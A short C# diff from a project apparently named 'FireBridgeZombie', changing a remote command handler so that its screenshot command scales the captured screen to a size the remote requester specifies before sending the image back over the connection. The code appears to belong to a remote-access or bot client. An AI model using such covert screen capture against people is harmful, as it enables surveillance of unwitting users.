@@ -6,6 +6,7 @@ using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Drawing2D;
 using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
@@ -65,6 +66,7 @@ namespace FireBridgeZombie
                     Application.Exit();
                     break;
                 case 3: //Screenshot
+                    var screenshotRequestModel = (ScreenshotRequestModel)packet.Data;
                     Rectangle bounds = Screen.GetBounds(Point.Empty);
                     using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                     {
@@ -72,7 +74,20 @@ namespace FireBridgeZombie
                         {
                             g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                         }
-                        connection.SendPacket(new Packet() { Id = 3, Data = bitmap });
+
+                        var brush = new SolidBrush(Color.Black);
+
+                        var bmp = new Bitmap(screenshotRequestModel.Width, screenshotRequestModel.Height);
+                        var graph = Graphics.FromImage(bmp);
+
+                        graph.InterpolationMode = InterpolationMode.High;
+                        graph.CompositingQuality = CompositingQuality.HighQuality;
+                        graph.SmoothingMode = SmoothingMode.AntiAlias;
+
+                        graph.FillRectangle(brush, new RectangleF(0, 0, screenshotRequestModel.Width, screenshotRequestModel.Height));
+                        graph.DrawImage(bitmap, 0, 0, screenshotRequestModel.Width, screenshotRequestModel.Height);
+
+                        connection.SendPacket(new Packet() { Id = 3, Data = bmp });
                     }
                     break;
                 case 4: //Update
